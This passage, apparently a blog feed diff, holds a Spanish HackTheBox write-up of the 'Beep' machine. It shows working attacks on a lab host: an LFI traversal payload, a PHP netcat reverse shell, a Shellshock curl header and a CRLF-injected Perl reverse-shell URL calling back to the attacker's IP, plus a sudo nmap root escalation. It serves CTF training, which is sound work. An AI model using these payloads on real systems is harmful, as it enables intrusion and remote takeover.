-000000245:   301        9 L      28 W       309 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;
-000000255:   301        9 L      28 W       310 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;static&quot;&lt;/span&gt;
-000001184:   301        9 L      28 W       308 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;lang&quot;&lt;/span&gt;
-000004689:   301        9 L      28 W       307 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;var&quot;&lt;/span&gt;
-000005506:   301        9 L      28 W       309 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;panel&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Al revisar los directorios, podemos identificar diferentes rutas que exponen la información sensible de los servicios encontrados, sin embargo, no se tiene éxito al conseguir una posible credencial del portal inicial, por tal razón buscamos exploits públicos que puedan tener relación con el servicio encontrado.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit elastix
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-Elastix 2.2.0 - &lt;span class=&quot;s1&quot;&gt;'graph.php'&lt;/span&gt; Local File Inclusion | php/webapps/37637.pl
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se detecta el siguiente exploit que logra una exposición de información sensible a través del aprovechamiento por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt; o local file inclusión, el cual se identifica explorando el exploit encontrado.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php/webapps/37637.pl
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Payload de explotación&lt;/span&gt;
-/vtigercrm/graph.php?current_language&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../..//etc/amportal.conf%00&amp;amp;module&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Accounts&amp;amp;action
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El siguiente paso es ejecutar lo anterior junto con nuestro objetivo en el navegador, de la siguiente manera.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://10.10.10.7/vtigercrm/graph.php?current_language&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../..//etc/amportal.conf%00&amp;amp;module&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Accounts&amp;amp;action
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/04-page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Esta máquina es bastante interesante por las diferentes maneras de llegar a realizar una intrusión en estos ejercicios, a continuación, vamos a ver algunas de estas.&lt;/p&gt;
-
-&lt;h2 id=&quot;intrusion--escalada-de-privilegios-ssh&quot;&gt;INTRUSION + ESCALADA DE PRIVILEGIOS SSH&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, debido a que tenemos acceso a contraseñas que pueden ser reutilizadas para acceder a la máquina por parte de un usuario administrador, así que básicamente vamos a ingresar con las credenciales que encontramos anteriormente y tenemos directamente acceso a una shell interactiva como usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh root@10.10.10.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultado&lt;/span&gt;
-Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
-
-ssh &lt;span class=&quot;nt&quot;&gt;-oKexAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;+diffie-hellman-group1-sha1 root@10.10.10.7
-root@10.10.10.7&lt;span class=&quot;s1&quot;&gt;'s password: 
-Last login: Tue Jul 16 11:45:47 2019
-
-Welcome to Elastix 
-----------------------------------------------------
-
-To access your Elastix System, using a separate workstation (PC/MAC/Linux)
-Open the Internet Browser using the following URL:
-http://10.10.10.7
-
-[root@beep ~]# whoami
-root
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-vtiger&quot;&gt;INTRUSION VTIGER&lt;/h2&gt;
-
-&lt;p&gt;La segunda intrusión se lleva por medio del ataque por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt;, toda vez que, es identificado el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtiguer&lt;/code&gt; como primera carpeta del payload ejecutado.&lt;/p&gt;
-
-&lt;p&gt;Logramos un acceso a un nuevo portal, por lo que vamos a probar las credenciales obtenidas, teniendo total capacidad de navegar en el servicio web.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/05-page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Realizamos la búsqueda de posibles vías de explotación en el portal, logrando ingresar a los detalles de la organización.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/06-page.png&quot; /&gt; 
-&lt;/p&gt;
-
-&lt;p&gt;En esta sección es posible subir archivos de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JGP&lt;/code&gt;, por lo que se procede a generar una shell en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP&lt;/code&gt; de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JGP&lt;/code&gt; de la siguiente manera.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim shell.php.jgp
-&amp;lt;?php
-	system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.3 4564 &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Guardamos la shell y subimos el contenido donde se almacena la imagen de la organización, no sin antes ponernos en escucha por el puerto que asignamos en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php.jgp&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Guardamos el archivo en la web y obtenemos una shell interactiva con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asterisk&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;asterisk
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-webmin&quot;&gt;INTRUSION WEBMIN&lt;/h2&gt;
-
-&lt;p&gt;Ingresamos al servicio alojado en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10000&lt;/code&gt; y automáticamente detectamos una extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CGI&lt;/code&gt;, lo que presuntamente puede ocasionar un ataque por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellshock&lt;/code&gt;, en esta ocasión la contraseña funcionó con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; así como sucedió en la intrusión por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, logrando un mayor grado de enumeración de la máquina víctima.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/07-page.png&quot; /&gt;   
-&lt;/p&gt;
-
-&lt;p&gt;Nos ponemos en escucha por medio de un listener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el siguiente comando, habilitando comunicaciones con cifrados débiles y entablando una reverse shell por medio de una ejecución remota de comandos en el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session_login.cgi&lt;/code&gt; como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;--tlsv1&lt;/span&gt;.0 &lt;span class=&quot;nt&quot;&gt;-sk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.10.7:10000/session_login.cgi&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; };echo;echo; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.3/4564 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@beep webmin]# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-18650py&quot;&gt;INTRUSION 18650.py&lt;/h2&gt;
-
-&lt;p&gt;Otro de los exploits públicos para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elastix&lt;/code&gt; es ocasionado por una ejecución remota de comandos, por lo que vamos a utilizar el exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;18650.py&lt;/code&gt; para esta intrusión.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit elastix
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos el exploit.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; php/webapps/18650.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Este script de explotación requiere de 4 datos:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;RHOST&lt;/li&gt;
-  &lt;li&gt;LHOST&lt;/li&gt;
-  &lt;li&gt;LPORT&lt;/li&gt;
-  &lt;li&gt;EXTENSIÓN&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;El único dato que no conocemos es el número de extensión, por lo que vamos a hacer uso de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svwar&lt;/code&gt; para identificar la posible o posibles extensiones configuradas en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svwar &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; INVITE &lt;span class=&quot;nt&quot;&gt;-e100-999&lt;/span&gt; 10.10.10.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-+-----------+----------------+
-| Extension | Authentication |
-+&lt;span class=&quot;o&quot;&gt;===========&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;+
-| 233       | reqauth        |
-+-----------+----------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Modificamos el script con los datos solicitados anteriormente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim 18650.py
-  &lt;span class=&quot;nv&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.7&quot;&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.10.14.3&quot;&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4564
-  &lt;span class=&quot;nv&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;233&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para este ejercicio debemos configurar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/ssl/openssl.cnf&lt;/code&gt; para lograr comunicaciones por cifrados débiles de la siguiente manera.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim /etc/ssl/openssl.cnf
-&lt;span class=&quot;c&quot;&gt;#MODIFICAR AL FINAL DEL ARCHIVO&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#MinProtocol = DEFAULT@SECLEVEL=2&lt;/span&gt;
-MinProtocol &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; None
-&lt;span class=&quot;c&quot;&gt;#CipherString = DEFAULT@SECLEVEL=2&lt;/span&gt;
-CipherString &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; None
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos ponemos ahora si en escucha.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el script con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python2&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 18650.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Obtenemos una shell con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asterisk&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.3] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.7] 37775
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;asterisk
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-payload-de-18650py&quot;&gt;INTRUSION PAYLOAD DE 18650.py&lt;/h2&gt;
-
-&lt;p&gt;Lo que realizamos es una variante del script anterior, detectando el tipo de solicitud que realiza a nivel web y modificando cada uno de los parámetros, agregando los permisos de ejecutar peticiones con cifrados débiles.&lt;/p&gt;
-
-&lt;p&gt;Creamos un listener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos la petición modificada.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;--ciphers&lt;/span&gt; DEFAULT@SECLEVEL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;--tlsv1&lt;/span&gt;.0 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.3%3a4564%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Obtenemos una shell con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asterisk&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.3] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.7] 60412
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;asterisk
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
-
-&lt;p&gt;Una vez que tenemos acceso a la máquina, realizamos el escalamiento de privilegios, en este caso, revisando los permisos a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-User asterisk may run the following commands on this host:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmap
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/yum
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/service
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;NOTA: Intenta realizar la escalada por cualquiera de estos 3 permisos a modo de ejercicio.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Se identifica que es posible ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/nmap&lt;/code&gt; con privilegios, por lo que vamos a hacer uso del escalamiento de &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/&quot;&gt;GTFObins&lt;/a&gt; obteniendo acceso al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-Starting Nmap V. 4.11 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; press h &amp;lt;enter&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
-&lt;/span&gt;nmap&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
-sh-3.2# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
-
-&lt;p&gt;Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#USER&lt;/span&gt;
-find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;52143a2a96
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#ROOT&lt;/span&gt;
-find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;a896454076
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beep&lt;/code&gt; de HackTheBox!&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/08-finish.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Beep" /><summary type="html">Vamos a resolver la máquina Beep de HackTheBox. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Bastard" /><summary type="html">Vamos a resolver la máquina Bastard de HackTheBox. ¡Let's hack!</summary></entry></feed>
